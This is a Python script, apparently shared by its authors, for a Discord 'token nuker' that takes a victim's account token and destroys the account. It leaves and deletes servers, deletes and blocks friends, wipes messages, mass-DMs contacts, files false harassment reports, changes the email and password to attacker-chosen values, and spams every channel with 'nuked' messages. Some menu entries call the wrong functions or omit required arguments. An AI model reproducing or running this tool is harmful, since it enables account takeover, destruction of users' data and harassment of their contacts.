import requests
import time
import base64
from pystyle import Colors, Colorate


def banner():
    print(Colorate.Horizontal(Colors.blue_to_purple, """
        ▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
        ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
        ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
        ░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
        ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
        ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
            ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
        ░      ░ ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░       ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
                    ░ ░  ░  ░      ░  ░         ░             ░    ░     ░  ░      ░  ░   ░                                                       
                                made by s.worm and britannique
                                        SHADOW
                                    .gg/fEJs8a2C5R
    """))

def authenticate(token):
    headers = {"Authorization": f"{token}"}
    return headers

def get_headers(token):
    return {
        'Authorization': token,
        'Content-Type': 'application/json',
    }

def new_title(title):
    print(f"{title}")

def clear():
    print("\033c", end="")

def Nuke_account(token):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Nuking account..."))
    leaveServer(token)
    deleteFriends(token)
    deleteServers(token)
    close_all_dms(token)
    blockAllFriends(token)
    deleteMessages(token)
    changeStatus(token)
    sendAbusiveReports(token)
    changeEmailPassword(token)
    changeThemeAndPrivacySettings(token)
    deleteAllRoles(token)
    sendMessagesInAllChannels(token)

def leaveServer(token):
    print("Leaving servers...")
    headers = authenticate(token)
    guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
    for guild in guilds:
        requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}", headers=headers)
    print(Colorate.Horizontal(Colors.blue_to_purple, "Left all servers."))

def deleteFriends(token):
    print("Deleting friends...")
    headers = authenticate(token)
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    for friend in friends:
        requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers=headers)
    print(Colorate.Horizontal(Colors.blue_to_purple, "Deleted all friends."))

def deleteServers(token):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Deleting servers..."))
    headers = authenticate(token)
    guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
    for guild in guilds:
        if guild['owner']:
            requests.delete(f"https://discord.com/api/v9/guilds/{guild['id']}", headers=headers)
    print(Colorate.Horizontal(Colors.blue_to_purple, "Deleted all servers where user was the owner."))

def massDM(token, content):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Sending mass DM..."))
    headers = authenticate(token)
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    for friend in friends:
        channel = requests.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json={"recipient_id": friend['id']}).json()
        requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers=headers, json={"content": content})
    print(Colorate.Horizontal(Colors.blue_to_purple, "Sent mass DM to all friends."))

def close_all_dms(token):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Closing all DMs..."))
    headers = authenticate(token)
    channels = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    for channel in channels:
        requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers)
    print(Colorate.Horizontal(Colors.blue_to_purple, "Closed all DMs."))

def blockAllFriends(token):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Blocking all friends..."))
    headers = authenticate(token)
    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    for friend in friends:
        requests.put(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers=headers, json={"type": 2})
    print(Colorate.Horizontal(Colors.blue_to_purple, "Blocked all friends."))

def deleteMessages(token):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Deleting all messages..."))
    headers = authenticate(token)
    channels = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    for channel in channels:
        messages = requests.get(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers=headers).json()
        for message in messages:
            requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}/messages/{message['id']}", headers=headers)
    print(Colorate.Horizontal(Colors.blue_to_purple, "Deleted all messages."))


def changeStatus(token):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Changing status..."))
    headers = authenticate(token)
    payload = {
        "custom_status": {
            "text": "Nuked by Shadow"
        }
    }
    requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)
    print(Colorate.Horizontal(Colors.blue_to_purple, "Changed status."))



def sendAbusiveReports(token, message_id, channel_id, guild_id):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Sending abusive reports..."))
    headers = authenticate(token)
    payload = {
        "channel_id": channel_id,
        "message_id": message_id,
        "guild_id": guild_id,
        "reason": "Harassment"
    }
    response = requests.post("https://discord.com/api/v9/report", headers=headers, json=payload)
    if response.status_code == 201:
        print(Colorate.Horizontal(Colors.blue_to_purple, "Sent abusive reports."))
    else:
        print(Colorate.Horizontal(Colors.red_to_purple, "Failed to send abusive reports."))

def changeEmailPassword(token, current_password):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Changing email and password..."))
    headers = authenticate(token)
    payload = {
        "email": "nuked@gmail.com",
        "new_password": "nuked97122.",
        "password": current_password 
    }
    response = requests.patch("https://discord.com/api/v9/users/@me", headers=headers, json=payload)
    if response.status_code == 200:
        print(Colorate.Horizontal(Colors.blue_to_purple, "Changed email and password."))
    else:
        print(Colorate.Horizontal(Colors.red_to_purple, "Failed to change email and password."))

def changeThemeAndPrivacySettings(token):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Changing theme and privacy settings..."))
    headers = authenticate(token)
    payload = {
        "theme": "light", 
        "explicit_content_filter": 2,
        "default_message_notifications": 1,
        "friend_source_flags": {
            "all": False,
            "mutual_guilds": False,
            "mutual_friends": False,
            "none": True
        }
    }
    requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)
    print(Colorate.Horizontal(Colors.blue_to_purple, "Changed theme and privacy settings."))

def deleteAllRoles(token):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Deleting all roles..."))
    headers = authenticate(token)
    guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
    for guild in guilds:
        roles = requests.get(f"https://discord.com/api/v9/guilds/{guild['id']}/roles", headers=headers).json()
        for role in roles:
            requests.delete(f"https://discord.com/api/v9/guilds/{guild['id']}/roles/{role['id']}", headers=headers)
    print(Colorate.Horizontal(Colors.blue_to_purple, "Deleted all roles."))

def sendMessagesInAllChannels(token):
    print(Colorate.Horizontal(Colors.blue_to_purple, "Sending messages in all channels..."))
    headers = authenticate(token)
    guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
    for guild in guilds:
        channels = requests.get(f"https://discord.com/api/v9/guilds/{guild['id']}/channels", headers=headers).json()
        for channel in channels:
            if channel['type'] == 0: 
                payload = {
                    "content": "This channel has been nuked!"
                }
                requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers=headers, json=payload)
    print(Colorate.Horizontal(Colors.blue_to_purple, "Sent messages in all channels."))

def quit1():
    print(Colorate.Horizontal(Colors.blue_to_purple, "Quitting..."))
    exit()

def Token_nuker():
    clear()
    banner()
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [1] Nuke Token"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [2] Leave Servers"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [3] Delete Friends"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [4] Delete Servers"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [5] Mass DM"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [6] Close DMs"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [7] Block All Friends"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [8] Delete Messages"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [9] Change Avatar"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [10] Change Status"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [11] Modify Profile"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [12] Send Abusive Reports"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [13] Change Email and Password"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [14] Change Theme and Privacy Settings"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [15] Delete All Roles"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [16] Send Messages in All Channels"))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          -- >    [0] Leave"))
    print()
    choice = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Choice: "))
    if choice == "1":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        Nuke_account(token)
        Token_nuker()
    elif choice == "2":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        leaveServer(token)
        Token_nuker()
    elif choice == "3":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        deleteFriends(token)
        Token_nuker()
    elif choice == "4":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        deleteServers(token)
        Token_nuker()
    elif choice == "5":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        content = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Message: "))
        massDM(token, content)
        Token_nuker()
    elif choice == "6":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        close_all_dms(token)
        Token_nuker()
    elif choice == "7":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        blockAllFriends(token)
        Token_nuker()
    elif choice == "8":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        deleteMessages(token)
        Token_nuker()
        Token_nuker()
    elif choice == "9":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        changeStatus(token)
        Token_nuker()
    elif choice == "10":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        sendAbusiveReports(token)
        Token_nuker()
    elif choice == "11":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        changeEmailPassword(token)
        Token_nuker()
    elif choice == "12":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        changeThemeAndPrivacySettings(token)
        Token_nuker()
    elif choice == "13":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        deleteAllRoles(token)
        Token_nuker()
    elif choice == "14":
        clear()
        banner()
        token = input(Colorate.Horizontal(Colors.blue_to_purple, "[?] Token: "))
        sendMessagesInAllChannels(token)
        Token_nuker()
    elif choice == "0":
        quit1()
    else:
        print("Invalid choice")
        time.sleep(1)
        Token_nuker()

Token_nuker()
